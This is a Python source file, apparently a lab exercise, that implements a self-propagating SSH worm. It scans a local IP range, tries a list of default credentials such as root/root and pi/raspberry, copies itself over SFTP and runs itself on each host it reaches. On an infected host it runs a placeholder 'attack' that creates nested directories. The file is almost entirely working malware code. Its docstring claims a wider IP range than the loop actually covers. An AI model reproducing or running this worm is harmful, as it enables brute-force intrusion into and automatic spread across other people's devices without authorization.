"""
Program worm should first:
1- create IP range list, 
2- try to ssh to devices within the IP range using list of user credentials
3- copy itself on ssh success
4- run the python there
5- call the harmful attack to attack the current PC it is running on
"""

import paramiko
import sys
import os
import socket
import random

ip_range = []

user_credentials_list = [
    "root root",
    "admin admin",
    "pi raspberry",
    "root abc",
    "root toor",
    "abc abc",
    "admin password",
]

""" 
A function that creates IP addresses and adds them to the ip_range list in the range
from 192.168.137.2 - 192.168.137.254
"""
def generate_IP_list():
    for i in range(143, 144): 
        ip = "192.168.137." + str(i)
        ip_range.append(ip)


"""
A function that iterates through the IP range and tries to SSH into each IP using the credentials in the user_credentials_list
"""
def start_ssh_devices():

    for ip in ip_range:
        print("\nTrying to ssh to Host : ", ip)
        print("\n--------------------------------\n")
        
        try:
            original_host_name = socket.gethostname() # the host generated from the built in function
            host_name_by_ip = socket.gethostbyaddr(ip) # host generated from the IP address
            network_host_name = host_name_by_ip[0].replace(".mshome.net", "") # get the machine name and remove .mshome.net (added by the IP scanning program)
            print("Hostname :  ",original_host_name) 
            print("Second host", network_host_name)
            if original_host_name == network_host_name:
                print ("Skip running the SSH scan on myself")
                continue

        except Exception:
            print("Host not found so skip the rest")
            continue

        ssh_connection = paramiko.SSHClient()

        ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())


        for credential in user_credentials_list:

            username_password = credential.split()
            username = username_password[0]
            password = username_password[1]

            try:
                print(
                    "Trying to ssh in with username :",
                    username,
                    " and password: ",
                    password,
                )
                ssh_connection.connect(ip, username=username, password=password, timeout=1) # added timeout to save time
                
                print("SSH to host ", ip, " succeeded! I am inside hahaha!!!")

                copy_worm_excute(ssh_connection)
                break

            except Exception:
                print("SSH to host ", ip, " failed...")
            


"""
A function that copies the worm file to the other device via ssh connection and run it there
"""
def copy_worm_excute(ssh_connx):

    worm_file = "sleepingWormy.py"
    #worm_file = "HelloHacker.py"

    print("Copying worm and excuting it now")

    ssh_sftp = ssh_connx.open_sftp()

    ssh_sftp.put(worm_file, "/" + worm_file)

    ssh_connx.exec_command("python /" + worm_file + " 1")

    # ssh.exec_command("nohup python /" + fileName + " 1 &")

    ssh_connx.close()


"""
A function that starts doing harmful attack to the device it is running on
"""
def start_attack():
    directory = "/tmq"
    count = 0
    while count < 2:
        try:
            os.mkdir(directory)
            print(directory)
            directory += "/tmq"
            count += 1
        except FileExistsError:
            directory += str(random.randint(1,100))


if __name__ == "__main__":

    generate_IP_list()
    start_ssh_devices()

    # the if statement below is to prevent the worm from harming my personal laptop, so it won't attack it but will ssh to other devices
    if len(sys.argv) > 1:
        if sys.argv[1] == "1":
            start_attack()
            print("inside if statement")
